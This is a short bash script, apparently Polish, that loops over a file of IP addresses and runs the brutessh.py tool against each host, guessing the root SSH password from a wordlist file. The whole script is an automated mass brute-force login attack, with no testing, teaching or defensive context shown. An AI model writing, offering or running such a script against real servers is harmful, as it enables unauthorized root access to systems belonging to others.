#!/bin/bash

lista=`cat /root/ipeczki2.txt`

for x in $lista ; do

python brutessh/brutessh.py  -h $x -u root -d /root/hasla.txt

done

